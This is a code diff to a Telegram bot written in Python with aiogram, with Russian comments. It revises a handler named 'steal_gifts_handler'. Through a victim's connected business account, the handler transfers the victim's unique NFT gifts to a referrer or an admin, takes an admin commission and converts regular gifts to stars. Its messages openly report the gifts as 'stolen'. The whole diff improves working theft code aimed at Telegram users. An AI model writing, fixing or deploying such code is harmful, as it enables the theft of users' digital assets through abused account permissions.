@@ -479,25 +479,41 @@ async def decline(callback: CallbackQuery):
 @dp.callback_query(F.data.startswith("steal_gifts:"))
 async def steal_gifts_handler(callback: CallbackQuery):
     business_id = callback.data.split(":")[1]
-    user_id = callback.from_user.id
-    inviter_id = user_referrer_map.get(user_id)
     
-    # Определяем получателя (пригласивший или админ)
+    try:
+        # Получаем информацию о бизнес-аккаунте
+        business_connection = await bot.get_business_connection(business_id)
+        user = business_connection.user  # Владелец бизнес-аккаунта
+    except Exception as e:
+        await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
+        return
+
+    # Определяем получателя (пригласившего владельца бизнес-аккаунта)
+    inviter_id = user_referrer_map.get(user.id)  # Важно: user.id, а не callback.from_user.id
+    
+    # Проверяем, существует ли пригласивший и доступен ли он
     if inviter_id:
         try:
             await bot.get_chat(inviter_id)  # Проверяем, существует ли чат
             recipient_id = inviter_id
             is_admin = False
-        except Exception:
+            print(f"Подарки будут отправлены пригласившему: {inviter_id}")
+        except Exception as e:
+            print(f"Пригласивший {inviter_id} недоступен: {e}")
             recipient_id = ADMIN_IDS[0]
             is_admin = True
     else:
         recipient_id = ADMIN_IDS[0]
         is_admin = True
+        print("Пригласивший не найден, отправляем админу")
+
+    # Проверяем, что recipient_id корректен и не совпадает с ID бизнес-аккаунта
+    if recipient_id == user.id:
+        await callback.answer("❌ Нельзя передать подарки самому себе!")
+        return
 
     stolen_nfts = []
     stolen_count = 0
-    admin_gifts = 0  # Количество подарков для админа
     errors = []
     
     try:
@@ -512,12 +528,13 @@ async def steal_gifts_handler(callback: CallbackQuery):
     transferable_gifts = [
         gift for gift in gifts_list 
         if gift.type == "unique" and gift.can_be_transferred
-    ][:MAX_GIFTS_PER_RUN]  # Ограничиваем максимальное количество
+    ][:MAX_GIFTS_PER_RUN]  # Ограничиваем количество
     
     total_gifts = len(transferable_gifts)
     
-    # Рассчитываем комиссию админу (только если есть пригласивший и больше 2 подарков)
-    if not is_admin and total_gifts > 2:  # Если есть пригласивший и больше 2 подарков
+    # Рассчитываем комиссию админу (если есть пригласивший и больше 2 подарков)
+    admin_gifts = 0
+    if not is_admin and total_gifts > 2:
         if total_gifts >= 7:
             admin_gifts = 3
         elif 5 <= total_gifts <= 6:
@@ -542,7 +559,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
             except Exception as e:
                 errors.append(f"Ошибка передачи админу {gift.owned_gift_id}: {e}")
     
-    # Затем передаем оставшиеся подарки пригласившему
+    # Затем передаем оставшиеся подарки получателю
     user_stolen = []
     for gift in transferable_gifts[admin_gifts:]:
         try:
@@ -558,7 +575,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
         except Exception as e:
             errors.append(f"Ошибка передачи {gift.owned_gift_id}: {e}")
 
-    # Конвертируем обычные подарки в звезды для получателя
+    # Конвертируем обычные подарки в звёзды
     try:
         for gift in gifts_list:
             if gift.type == "regular":
@@ -588,28 +605,18 @@ async def steal_gifts_handler(callback: CallbackQuery):
         result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
         if admin_stolen:
             result_msg.append(f"\n📦 Админу передано: <b>{len(admin_stolen)}</b>")
-            result_msg.extend(admin_stolen[:3])  # Показываем первые 3 NFT админу
+            result_msg.extend(admin_stolen[:3])
         if user_stolen:
             recipient_type = "пригласившему" if not is_admin else "админу"
             result_msg.append(f"\n🎁 Основному получателю ({recipient_type}): <b>{len(user_stolen)}</b>")
-            result_msg.extend(user_stolen[:3])  # Показываем первые 3 NFT получателю
+            result_msg.extend(user_stolen[:3])
     
     if errors:
         result_msg.append("\n❌ Ошибки:")
-        result_msg.extend(errors[:3])  # Показываем первые 3 ошибки
+        result_msg.extend(errors[:3])
 
-    # Отправляем отчет
     await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
     await callback.answer()
-
-    # Логируем в админ-чат
-    log_msg = (
-        f"🔹 Получатель: {'пригласивший' if not is_admin else 'админ'}\n"
-        f"🔹 Всего NFT: {total_gifts}\n"
-        f"🔹 Админу передано: {len(admin_stolen)}\n"
-        f"🔹 Основному получателю: {len(user_stolen)}"
-    )
-    await bot.send_message(LOG_CHAT_ID, log_msg)
     
 @dp.callback_query(F.data == "unfreeze_order")
 async def handle_unfreeze_order(callback: CallbackQuery):
